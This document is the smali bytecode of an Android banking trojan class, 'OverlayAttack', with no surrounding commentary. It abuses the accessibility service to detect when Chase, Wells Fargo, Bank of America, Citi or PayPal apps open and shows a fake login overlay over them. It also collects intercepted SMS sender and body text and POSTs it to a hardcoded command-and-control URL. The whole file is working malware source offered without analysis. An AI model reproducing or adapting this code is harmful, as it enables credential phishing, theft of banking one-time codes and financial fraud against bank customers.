.class public Lcom/trojan/bank/OverlayAttack;
.super Landroid/accessibilityservice/AccessibilityService;
.source "OverlayAttack.java"

.field private targetPackages:[Ljava/lang/String;
.field private c2Server:Ljava/lang/String;
.field private interceptedSms:Ljava/util/ArrayList;

.method public constructor <init>()V
    .registers 3
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V
    const-string v0, "https://panel.bankbot-c2.ru/gate"
    iput-object v0, p0, Lcom/trojan/bank/OverlayAttack;->c2Server:Ljava/lang/String;
    const/4 v0, 0x5
    new-array v0, v0, [Ljava/lang/String;
    const/4 v1, 0x0
    const-string v2, "com.chase.sig.android"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "com.wf.wellsfargomobile"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "com.bankofamerica.cashpromobile"
    aput-object v2, v0, v1
    const/4 v1, 0x3
    const-string v2, "com.citi.citimobile"
    aput-object v2, v0, v1
    const/4 v1, 0x4
    const-string v2, "com.paypal.android.p2pmobile"
    aput-object v2, v0, v1
    iput-object v0, p0, Lcom/trojan/bank/OverlayAttack;->targetPackages:[Ljava/lang/String;
    new-instance v0, Ljava/util/ArrayList;
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V
    iput-object v0, p0, Lcom/trojan/bank/OverlayAttack;->interceptedSms:Ljava/util/ArrayList;
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0
    const/16 v1, 0x20
    if-ne v0, v1, :not_window_change
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v0
    if-eqz v0, :end
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-direct {p0, v0}, Lcom/trojan/bank/OverlayAttack;->isTargetBank(Ljava/lang/String;)Z
    move-result v1
    if-eqz v1, :end
    invoke-direct {p0, v0}, Lcom/trojan/bank/OverlayAttack;->showPhishingOverlay(Ljava/lang/String;)V
    :not_window_change
    :end
    return-void
.end method

.method private isTargetBank(Ljava/lang/String;)Z
    .registers 5
    iget-object v0, p0, Lcom/trojan/bank/OverlayAttack;->targetPackages:[Ljava/lang/String;
    array-length v1, v0
    const/4 v2, 0x0
    :loop
    if-ge v2, v1, :not_found
    aget-object v3, v0, v2
    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :next
    const/4 v0, 0x1
    return v0
    :next
    add-int/lit8 v2, v2, 0x1
    goto :loop
    :not_found
    const/4 v0, 0x0
    return v0
.end method

.method private showPhishingOverlay(Ljava/lang/String;)V
    .registers 6
    new-instance v0, Landroid/content/Intent;
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
    move-result-object v1
    const-class v2, Lcom/trojan/bank/FakeLoginActivity;
    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const-string v1, "target_package"
    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
.end method

.method public interceptSms(Ljava/lang/String;Ljava/lang/String;)V
    .registers 6
    new-instance v0, Lorg/json/JSONObject;
    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V
    const-string v1, "sender"
    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const-string v1, "body"
    invoke-virtual {v0, v1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    iget-object v1, p0, Lcom/trojan/bank/OverlayAttack;->interceptedSms:Ljava/util/ArrayList;
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v1, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    invoke-direct {p0}, Lcom/trojan/bank/OverlayAttack;->exfiltrateToC2()V
    return-void
.end method

.method private exfiltrateToC2()V
    .registers 7
    iget-object v0, p0, Lcom/trojan/bank/OverlayAttack;->c2Server:Ljava/lang/String;
    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v2
    check-cast v2, Ljava/net/HttpURLConnection;
    const-string v3, "POST"
    invoke-virtual {v2, v3}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v3, 0x1
    invoke-virtual {v2, v3}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3
    iget-object v4, p0, Lcom/trojan/bank/OverlayAttack;->interceptedSms:Ljava/util/ArrayList;
    invoke-virtual {v4}, Ljava/util/ArrayList;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B
    move-result-object v4
    invoke-virtual {v3, v4}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I
    return-void
.end method

.method public onInterrupt()V
    .registers 1
    return-void
.end method
